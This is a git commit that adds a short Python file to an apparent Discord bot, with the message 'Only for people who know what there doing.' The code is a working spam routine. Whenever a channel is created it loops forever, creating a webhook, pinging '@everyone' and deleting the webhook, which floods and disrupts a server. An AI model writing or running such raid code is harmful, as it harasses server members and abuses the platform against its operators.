6f869425881a9709c4f560ddba2e7e68e93216db
XxGamerBroskixX <57766870+XxGamerBroskixX@users.noreply.github.com>
2020-05-22 04:07:26 -0400

    Create OtherFunctions.py
    Only for people who know what there doing.

---
+++ OtherFunctions.py
@@ -0,0 +1,10 @@
+@bot.event
+async def on_guild_channel_create(channel):
+ while True:
+  async with aiohttp.ClientSession() as session:
+    with open(('YOURFILEDIRECTORYHERE.png'), 'rb') as f:
+      img = f.read()
+    webhook = await channel.create_webhook(name='Webhook',avatar=img)
+    await webhook.send("@everyone")
+    await webhook.delete()
+
